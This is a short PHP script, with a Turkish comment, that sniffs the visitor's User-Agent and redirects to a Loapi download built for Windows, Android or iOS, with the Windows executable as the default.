<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if (preg_match('/Windows/i', $user_agent)) {
    header('Location: /downloads/Loapi.exe');
    exit;
} elseif (preg_match('/Android/i', $user_agent)) {
    header('Location: /downloads/Loapi.apk');
    exit;
} elseif (preg_match('/iPhone|iPad|iPod/i', $user_agent)) {
    header('Location: /downloads/Loapi.ipa');
    exit;
} else {
    // Diğer işletim sistemleri için varsayılan indirme
    header('Location: /downloads/Loapi.exe');
    exit;
}
?>
